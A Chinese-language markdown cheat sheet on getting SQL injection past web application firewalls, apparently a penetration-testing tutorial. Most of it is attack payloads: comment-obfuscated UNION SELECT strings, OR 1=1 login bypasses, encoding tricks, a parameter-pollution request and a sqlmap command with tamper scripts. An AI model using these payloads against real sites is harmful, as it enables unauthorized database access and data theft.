```
---

### 文档 2：Web漏洞_SQL注入绕过WAF.md

```markdown
# SQL注入绕过 WAF 实战技巧

## 经典绕过手法

### 1. 注释符混淆
```sql
-- 内联注释
UNI/**/ON SEL/**/ECT 1,2,3

-- MySQL 版本号注释
/*!50000SELECT*/ user FROM users

-- 末尾注释变种
admin' OR 1=1 -- -
admin' OR 1=1 #
```



### 2. 编码绕过

| 编码类型       | 示例                        | 适用场景           |
| :------------- | :-------------------------- | :----------------- |
| 双重 URL 编码  | `%2527` → `%27` → `'`       | 云 WAF 未递归解码  |
| Unicode 规范化 | `U+FF07` (全角单引号)       | 某些数据库自动转换 |
| 十六进制       | `0x73656c656374` → `select` | 替换关键字         |

### 3. HTTP 参数污染 (HPP)

http

```
GET /search.php?id=1&id=2 UNION SELECT 1,2,3 HTTP/1.1
```



- **ASP/IIS**：拼接两个值 `1,2 UNION SELECT`
- **PHP**：取最后一个值 `2 UNION SELECT`

## 数据库特性利用

### MySQL

- 科学计数法：`1e0union select`
- 反引号：``select``
- 换行符：`%0aunion%0aselect`

### MSSQL

- 空注释：`/*!/*/union/*!/*/select`
- 全局变量：`@@version`

## 自动化工具辅助

- **sqlmap** 可检测和绕过 WAF，常用参数：

bash

```
sqlmap -u "http://target.com?id=1" --tamper=space2comment,randomcase
```



**记住**：手工测试时，先用 `and 1=1` 和 `and 1=2` 判断是否存在注入点，再用 `order by` 判断列数。